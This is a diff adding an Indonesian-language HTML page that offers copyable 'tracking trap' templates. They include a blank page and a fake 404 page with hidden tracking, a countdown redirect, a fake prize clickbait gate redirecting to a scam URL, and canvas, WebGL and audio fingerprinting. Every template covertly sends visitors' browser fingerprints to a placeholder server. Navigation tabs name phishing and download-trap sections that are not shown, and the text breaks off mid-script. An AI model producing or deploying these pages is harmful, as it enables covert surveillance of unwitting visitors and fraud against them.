@@ -1,0 +1,1896 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRACKING SYSTEM - TEMPLATE COLLECTION</title>
+    <style>
+        /* Global Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            line-height: 1.6;
+        }
+        
+        /* Template Navigation */
+        .template-nav {
+            background: #001100;
+            padding: 15px;
+            border-bottom: 2px solid #00ff00;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .nav-btn {
+            background: transparent;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 8px 15px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        
+        .nav-btn:hover {
+            background: #00ff00;
+            color: #000;
+        }
+        
+        .nav-btn.active {
+            background: #00ff00;
+            color: #000;
+        }
+        
+        /* Template Container */
+        .template-container {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 20px;
+        }
+        
+        /* Template Sections */
+        .template-section {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+        
+        .template-section.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        /* Template Cards */
+        .template-card {
+            background: #000;
+            border: 1px solid #00ff00;
+            margin-bottom: 30px;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .card-header {
+            background: #001100;
+            padding: 15px;
+            border-bottom: 1px solid #00ff00;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .card-header h3 {
+            color: #00ff00;
+            font-size: 18px;
+        }
+        
+        .card-badge {
+            background: #00ff00;
+            color: #000;
+            padding: 3px 10px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .card-body {
+            padding: 20px;
+        }
+        
+        /* Code Blocks */
+        .code-block {
+            background: #001100;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+        
+        .code-header {
+            background: #002200;
+            padding: 8px 15px;
+            border-bottom: 1px solid #00ff00;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .code-header span {
+            color: #00ff00;
+            font-size: 12px;
+        }
+        
+        .copy-btn {
+            background: transparent;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 3px 10px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+        
+        .copy-btn:hover {
+            background: #00ff00;
+            color: #000;
+        }
+        
+        pre {
+            margin: 0;
+            padding: 15px;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+        
+        /* Feature List */
+        .feature-list {
+            list-style: none;
+            margin: 15px 0;
+        }
+        
+        .feature-list li {
+            margin: 8px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+        
+        .feature-list li:before {
+            content: ">";
+            position: absolute;
+            left: 0;
+            color: #00ff00;
+        }
+        
+        /* Preview Button */
+        .preview-btn {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+        
+        .preview-btn:hover {
+            background: #00cc00;
+        }
+        
+        /* Terminal Style */
+        .terminal-window {
+            background: #000;
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        
+        .terminal-header {
+            background: #001100;
+            padding: 8px 15px;
+            border-bottom: 1px solid #00ff00;
+        }
+        
+        .terminal-title {
+            color: #00ff00;
+            font-size: 12px;
+        }
+        
+        .terminal-body {
+            padding: 20px;
+            min-height: 200px;
+        }
+        
+        /* Loading Animation */
+        .loader {
+            border: 2px solid #001100;
+            border-top: 2px solid #00ff00;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Matrix Effect */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            opacity: 0.1;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix Background Effect -->
+    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
+
+    <!-- Navigation -->
+    <div class="template-nav">
+        <div class="nav-container">
+            <button class="nav-btn active" onclick="showTemplate('stealth')">STEALTH MODE</button>
+            <button class="nav-btn" onclick="showTemplate('redirect')">REDIRECT TRAP</button>
+            <button class="nav-btn" onclick="showTemplate('fingerprint')">FINGERPRINT</button>
+            <button class="nav-btn" onclick="showTemplate('phishing')">PHISHING PAGE</button>
+            <button class="nav-btn" onclick="showTemplate('download')">DOWNLOAD TRAP</button>
+            <button class="nav-btn" onclick="showTemplate('admin')">ADMIN PANEL</button>
+        </div>
+    </div>
+
+    <!-- Template Container -->
+    <div class="template-container">
+        <!-- ========== STEALTH MODE TEMPLATES ========== -->
+        <div id="stealth" class="template-section active">
+            <h2 style="margin-bottom: 20px;">▸ STEALTH MODE TRACKING</h2>
+            
+            <!-- Template 1: Blank Page -->
+            <div class="template-card">
+                <div class="card-header">
+                    <h3>01 :: BLANK PAGE TRACKER</h3>
+                    <span class="card-badge">STEALTH</span>
+                </div>
+                <div class="card-body">
+                    <p>Halaman kosong dengan tracking tersembunyi. Visitor tidak sadar sedang dilacak.</p>
+                    
+                    <div class="feature-list">
+                        <li>Zero visual content</li>
+                        <li>Background tracking</li>
+                        <li>Auto-collect fingerprint</li>
+                        <li>Silent redirect option</li>
+                    </div>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>blank_tracker.html</span>
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                        </div>
+                        <pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;title&gt;&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            background: #fff;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            opacity: 0;
+        }
+        iframe {
+            display: none;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Tracking Pixel --&gt;
+    &lt;img src="https://your-server.com/track/pixel.gif" width="1" height="1" style="display:none"&gt;
+    
+    &lt;!-- JavaScript Fingerprint --&gt;
+    &lt;script&gt;
+        (function() {
+            // Collect system info
+            const fingerprint = {
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookies: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardware: {
+                    ram: navigator.deviceMemory || 'unknown',
+                    cores: navigator.hardwareConcurrency || 'unknown'
+                },
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                fonts: detectFonts(),
+                canvas: getCanvasFingerprint(),
+                webgl: getWebGLFingerprint()
+            };
+            
+            // Send to server
+            fetch('https://your-server.com/api/fingerprint', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(fingerprint),
+                keepalive: true
+            });
+            
+            // Optional: Silent redirect after tracking
+            // setTimeout(() => {
+            //     window.location.replace('https://target-site.com');
+            // }, 100);
+        })();
+
+        // Font detection
+        function detectFonts() {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana'];
+            return fontList.filter(font => document.fonts.check(`12px "${font}"`));
+        }
+
+        // Canvas fingerprint
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 50;
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(0, 0, 100, 50);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Fingerprint', 2, 15);
+            return canvas.toDataURL().slice(0, 100);
+        }
+
+        // WebGL fingerprint
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                } : 'WebGL not available';
+            } catch(e) {
+                return 'WebGL error';
+            }
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Template 2: 404 Error Page -->
+            <div class="template-card">
+                <div class="card-header">
+                    <h3>02 :: FAKE 404 ERROR PAGE</h3>
+                    <span class="card-badge">STEALTH</span>
+                </div>
+                <div class="card-body">
+                    <p>Menampilkan halaman error palsu sambil tetap melakukan tracking.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>fake_404.html</span>
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                        </div>
+                        <pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;404 Not Found&lt;/title&gt;
+    &lt;style&gt;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #f5f5f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        .error-container {
+            max-width: 500px;
+            padding: 40px;
+        }
+        h1 {
+            font-size: 72px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .dots {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        .dot {
+            width: 10px;
+            height: 10px;
+            background: #999;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+        .hidden-tracker {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="error-container"&gt;
+        &lt;h1&gt;404&lt;/h1&gt;
+        &lt;p&gt;Halaman yang Anda cari tidak ditemukan&lt;/p&gt;
+        &lt;div class="dots"&gt;
+            &lt;div class="dot"&gt;&lt;/div&gt;
+            &lt;div class="dot"&gt;&lt;/div&gt;
+            &lt;div class="dot"&gt;&lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Hidden Tracker --&gt;
+    &lt;div class="hidden-tracker"&gt;
+        &lt;img src="https://your-server.com/track/pixel.gif" width="1" height="1"&gt;
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        // Send tracking data silently
+        (function() {
+            const data = {
+                url: window.location.href,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            // Use sendBeacon for reliable delivery even when page closes
+            navigator.sendBeacon('https://your-server.com/api/track', JSON.stringify(data));
+        })();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== REDIRECT TRAP TEMPLATES ========== -->
+        <div id="redirect" class="template-section">
+            <h2 style="margin-bottom: 20px;">▸ REDIRECT TRAP PAGES</h2>
+            
+            <!-- Template 3: Countdown Redirect -->
+            <div class="template-card">
+                <div class="card-header">
+                    <h3>03 :: COUNTDOWN REDIRECT</h3>
+                    <span class="card-badge">TRAP</span>
+                </div>
+                <div class="card-body">
+                    <p>Menampilkan countdown sebelum redirect ke target, sambil mengumpulkan data.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>countdown_redirect.html</span>
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                        </div>
+                        <pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Mengalihkan...&lt;/title&gt;
+    &lt;style&gt;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+        }
+        .redirect-box {
+            border: 2px solid #00ff00;
+            padding: 40px;
+            border-radius: 10px;
+            background: #000;
+            box-shadow: 0 0 20px rgba(0,255,0,0.2);
+        }
+        h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(0,255,0,0.5);
+        }
+        .countdown {
+            font-size: 72px;
+            font-weight: bold;
+            margin: 20px 0;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .url {
+            color: #008800;
+            margin: 20px 0;
+            word-break: break-all;
+        }
+        .skip {
+            color: #008800;
+            cursor: pointer;
+            text-decoration: underline;
+            margin-top: 20px;
+        }
+        .skip:hover {
+            color: #00ff00;
+        }
+        .matrix-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;canvas class="matrix-rain" id="matrixRain"&gt;&lt;/canvas&gt;
+    
+    &lt;div class="container"&gt;
+        &lt;div class="redirect-box"&gt;
+            &lt;h1&gt;MENGALIHKAN...&lt;/h1&gt;
+            &lt;div class="countdown" id="countdown"&gt;5&lt;/div&gt;
+            &lt;div class="url" id="targetUrl"&gt;&lt;/div&gt;
+            &lt;div class="skip" onclick="redirectNow()"&gt;[ LANGSUNGKAN ]&lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        // Target URL (ambil dari parameter atau default)
+        const urlParams = new URLSearchParams(window.location.search);
+        const target = urlParams.get('url') || 'https://example.com';
+        document.getElementById('targetUrl').textContent = target;
+
+        // Tracking data collection
+        const trackingData = {
+            ip: '{{client_ip}}',  // Akan diisi server-side
+            timestamp: new Date().toISOString(),
+            url: window.location.href,
+            referrer: document.referrer,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            cookies: navigator.cookieEnabled,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            historyLength: history.length,
+            touchSupport: 'ontouchstart' in window,
+            platform: navigator.platform,
+            doNotTrack: navigator.doNotTrack,
+            connection: navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt
+            } : 'unknown'
+        };
+
+        // Send tracking data
+        fetch('https://your-server.com/api/track', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(trackingData),
+            keepalive: true
+        });
+
+        // Countdown logic
+        let seconds = 5;
+        const countdownEl = document.getElementById('countdown');
+        
+        const interval = setInterval(() => {
+            seconds--;
+            countdownEl.textContent = seconds;
+            
+            if (seconds <= 0) {
+                clearInterval(interval);
+                redirectNow();
+            }
+        }, 1000);
+
+        function redirectNow() {
+            // Send final tracking before redirect
+            trackingData.redirectTime = new Date().toISOString();
+            trackingData.action = 'manual_redirect';
+            
+            navigator.sendBeacon('https://your-server.com/api/final', JSON.stringify(trackingData));
+            
+            // Execute redirect
+            window.location.href = target;
+        }
+
+        // Matrix rain effect
+        const canvas = document.getElementById('matrixRain');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        
+        const drops = [];
+        for(let i = 0; i < columns; i++) {
+            drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#0f0';
+            ctx.font = fontSize + 'px monospace';
+            
+            for(let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 35);
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Template 4: Clickbait Redirect -->
+            <div class="template-card">
+                <div class="card-header">
+                    <h3>04 :: CLICKBAIT GATE</h3>
+                    <span class="card-badge">TRAP</span>
+                </div>
+                <div class="card-body">
+                    <p>Halaman clickbait yang memaksa user klik untuk lanjut.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>clickbait_gate.html</span>
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                        </div>
+                        <pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;⚠️ PERINGATAN! Anda adalah pengunjung ke-1000000! ⚠️&lt;/title&gt;
+    &lt;style&gt;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Arial', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: pop 0.5s ease-out;
+        }
+        @keyframes pop {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .badge {
+            background: #ff4757;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            margin-bottom: 20px;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 28px;
+        }
+        .prize {
+            font-size: 48px;
+            color: #ff4757;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        .counter {
+            background: #f1f2f6;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 24px;
+        }
+        .counter span {
+            color: #ff4757;
+            font-weight: bold;
+            font-size: 36px;
+        }
+        .button {
+            background: #ff4757;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: bold;
+            transition: transform 0.3s;
+            width: 100%;
+        }
+        .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(255,71,87,0.4);
+        }
+        .fake-progress {
+            width: 100%;
+            height: 10px;
+            background: #f1f2f6;
+            border-radius: 5px;
+            margin: 30px 0 10px;
+            overflow: hidden;
+        }
+        .fake-progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #ff4757;
+            animation: progress 3s forwards;
+        }
+        @keyframes progress {
+            to { width: 100%; }
+        }
+        .small-text {
+            color: #999;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="card"&gt;
+        &lt;div class="badge"&gt;🔥 HOT PROMO 🔥&lt;/div&gt;
+        &lt;h1&gt;SELAMAT!&lt;/h1&gt;
+        &lt;p&gt;Anda adalah pengunjung ke:&lt;/p&gt;
+        &lt;div class="counter"&gt;
+            &lt;span id="visitorCount"&gt;1,000,000&lt;/span&gt;
+        &lt;/div&gt;
+        &lt;div class="prize"&gt;
+            🎁 IPHONE 15 PRO 🎁
+        &lt;/div&gt;
+        &lt;p&gt;Klik tombol di bawah untuk klaim hadiah Anda!&lt;/p&gt;
+        
+        &lt;div class="fake-progress"&gt;
+            &lt;div class="fake-progress-bar"&gt;&lt;/div&gt;
+        &lt;/div&gt;
+        
+        &lt;button class="button" onclick="handleClick()"&gt;
+            KLAIM HADIAH SEKARANG!
+        &lt;/button&gt;
+        
+        &lt;p class="small-text"&gt;*Syarat dan ketentuan berlaku&lt;/p&gt;
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        // Tracking
+        const startTime = Date.now();
+        let clicked = false;
+
+        // Collect fingerprint
+        const fingerprint = {
+            sessionId: generateSessionId(),
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            cookies: navigator.cookieEnabled,
+            plugins: Array.from(navigator.plugins).map(p => p.name).slice(0, 5),
+            timeOnPage: 0
+        };
+
+        function generateSessionId() {
+            return 'xxxx-xxxx-xxxx-xxxx'.replace(/[x]/g, () => 
+                Math.floor(Math.random() * 16).toString(16));
+        }
+
+        // Track time on page
+        setInterval(() => {
+            if (!clicked) {
+                fingerprint.timeOnPage = Math.floor((Date.now() - startTime) / 1000);
+            }
+        }, 1000);
+
+        function handleClick() {
+            clicked = true;
+            fingerprint.clickTime = new Date().toISOString();
+            fingerprint.timeOnPage = Math.floor((Date.now() - startTime) / 1000);
+            fingerprint.action = 'button_clicked';
+
+            // Send tracking data
+            navigator.sendBeacon('https://your-server.com/api/click', JSON.stringify(fingerprint));
+
+            // Redirect to actual target
+            const target = getParameterByName('url') || 'https://example.com/scam';
+            window.location.href = target;
+        }
+
+        function getParameterByName(name) {
+            const url = new URL(window.location.href);
+            return url.searchParams.get(name);
+        }
+
+        // Animate counter
+        let count = 999990;
+        const counterEl = document.getElementById('visitorCount');
+        setInterval(() => {
+            count += Math.floor(Math.random() * 10);
+            counterEl.textContent = count.toLocaleString();
+        }, 2000);
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== FINGERPRINT TEMPLATES ========== -->
+        <div id="fingerprint" class="template-section">
+            <h2 style="margin-bottom: 20px;">▸ ADVANCED FINGERPRINTING</h2>
+            
+            <!-- Template 5: Canvas Fingerprint -->
+            <div class="template-card">
+                <div class="card-header">
+                    <h3>05 :: CANVAS FINGERPRINTING</h3>
+                    <span class="card-badge">FINGERPRINT</span>
+                </div>
+                <div class="card-body">
+                    <p>Menggunakan canvas rendering untuk membuat fingerprint unik.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>canvas_fingerprint.html</span>
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                        </div>
+                        <pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Canvas Fingerprint Demo&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 40px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            border: 2px solid #00ff00;
+            padding: 30px;
+            background: #000;
+        }
+        h1 {
+            text-align: center;
+            border-bottom: 1px solid #00ff00;
+            padding-bottom: 20px;
+        }
+        .fingerprint-data {
+            margin: 30px 0;
+            padding: 20px;
+            background: #001100;
+            border: 1px solid #00ff00;
+        }
+        .data-row {
+            margin: 10px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+        .label {
+            color: #008800;
+        }
+        .value {
+            color: #00ff00;
+            font-weight: bold;
+        }
+        canvas {
+            border: 1px solid #00ff00;
+            display: block;
+            margin: 20px auto;
+            max-width: 100%;
+        }
+        .hidden-canvas {
+            display: none;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="container"&gt;
+        &lt;h1&gt;CANVAS FINGERPRINTING&lt;/h1&gt;
+        
+        &lt;div class="fingerprint-data" id="fingerprintData"&gt;
+            &lt;div class="data-row"&gt;
+                &lt;span class="label"&gt;Canvas Hash:&lt;/span&gt;
+                &lt;span class="value" id="canvasHash"&gt;calculating...&lt;/span&gt;
+            &lt;/div&gt;
+            &lt;div class="data-row"&gt;
+                &lt;span class="label"&gt;WebGL Renderer:&lt;/span&gt;
+                &lt;span class="value" id="webglRenderer"&gt;calculating...&lt;/span&gt;
+            &lt;/div&gt;
+            &lt;div class="data-row"&gt;
+                &lt;span class="label"&gt;WebGL Vendor:&lt;/span&gt;
+                &lt;span class="value" id="webglVendor"&gt;calculating...&lt;/span&gt;
+            &lt;/div&gt;
+            &lt;div class="data-row"&gt;
+                &lt;span class="label"&gt;Audio Context:&lt;/span&gt;
+                &lt;span class="value" id="audioFingerprint"&gt;calculating...&lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+
+        &lt;canvas id="displayCanvas" width="300" height="150"&gt;&lt;/canvas&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Hidden canvases for fingerprinting --&gt;
+    &lt;canvas id="fingerprintCanvas1" width="200" height="50" class="hidden-canvas"&gt;&lt;/canvas&gt;
+    &lt;canvas id="fingerprintCanvas2" width="200" height="50" class="hidden-canvas"&gt;&lt;/canvas&gt;
+    &lt;canvas id="fingerprintCanvas3" width="200" height="50" class="hidden-canvas"&gt;&lt;/canvas&gt;
+
+    &lt;script&gt;
+        (function() {
+            // Main fingerprinting function
+            function getCanvasFingerprint() {
+                const canvas = document.getElementById('fingerprintCanvas1');
+                const ctx = canvas.getContext('2d');
+                
+                // Draw complex shapes with text and colors
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 100, 50);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Fingerprint', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Browser', 50, 30);
+                
+                // Draw circles and lines
+                ctx.beginPath();
+                ctx.arc(150, 25, 20, 0, Math.PI * 2);
+                ctx.strokeStyle = '#ff0000';
+                ctx.lineWidth = 2;
+                ctx.stroke();
+                
+                // Draw bezier curve
+                ctx.beginPath();
+                ctx.moveTo(75, 40);
+                ctx.bezierCurveTo(100, 50, 120, 70, 140, 40);
+                ctx.strokeStyle = '#00ff00';
+                ctx.lineWidth = 3;
+                ctx.stroke();
+                
+                // Get canvas data as hash
+                const dataURL = canvas.toDataURL();
+                return simpleHash(dataURL);
+            }
+
+            function getWebGLFingerprint() {
+                try {
+                    const canvas = document.getElementById('fingerprintCanvas2');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    
+                    if (!gl) return { renderer: 'WebGL not supported', vendor: 'WebGL not supported' };
+                    
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        return {
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
+                        };
+                    }
+                    return { renderer: 'Unknown', vendor: 'Unknown' };
+                } catch(e) {
+                    return { renderer: 'Error', vendor: 'Error' };
+                }
+            }
+
+            function getAudioFingerprint() {
+                try {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    if (!AudioContext) return 'AudioContext not supported';
+                    
+                    const audioCtx = new AudioContext();
+                    const analyser = audioCtx.createAnalyser();
+                    const oscillator = audioCtx.createOscillator();
+                    const gainNode = audioCtx.createGain();
+                    
+                    oscillator.type = 'triangle';
+                    oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
+                    
+                    oscillator.connect(gainNode);
+                    gainNode.connect(analyser);
+                    
+                    oscillator.start(0);
+                    oscillator.stop(0.1);
+                    
+                    const dataArray = new Uint8Array(analyser.frequencyBinCount);
+                    analyser.getByteFrequencyData(dataArray);
+                    
+                    // Create hash from audio data
+                    const hash = Array.from(dataArray.slice(0, 20)).join('');
+                    return simpleHash(hash);
+                } catch(e) {
+                    return 'Audio fingerprint error';
+                }
+            }
+
+            function simpleHash(str) {
+                let hash = 0;
+                for (let i = 0; i < str.length; i++) {
+                    const char = str.charCodeAt(i);
+                    hash = ((hash << 5) - hash) + char;
+                    hash = hash & hash;
+                }
+                return Math.abs(hash).toString(16);
+            }
+
+            // Get all fingerprints
+            const canvasHash = getCanvasFingerprint();
+            const webglData = getWebGLFingerprint();
+            const audioHash = getAudioFingerprint();
+
+            // Update display
+            document.getElementById('canvasHash').textContent = canvasHash;
+            document.getElementById('webglRenderer').textContent = webglData.renderer;
+            document.getElementById('webglVendor').textContent = webglData.vendor;
